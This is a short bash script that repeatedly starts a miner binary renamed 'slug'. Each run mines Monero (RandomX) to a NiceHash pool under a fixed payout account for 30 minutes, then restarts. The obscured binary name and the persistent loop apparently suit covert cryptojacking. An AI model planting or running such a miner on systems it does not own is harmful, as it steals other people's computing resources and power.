#!/bin/bash

while true; do
    ./slug -o stratum+ssl://randomxmonero.auto.nicehash.com:443 -a rx -k -u NHbLt4t5HiuQaT4qrLCBnoEUeKH1aG44eGdG.slug -p x &
    slug_pid=$!
    sleep 1800
    kill $slug_pid
    wait $slug_pid 2>/dev/null
done
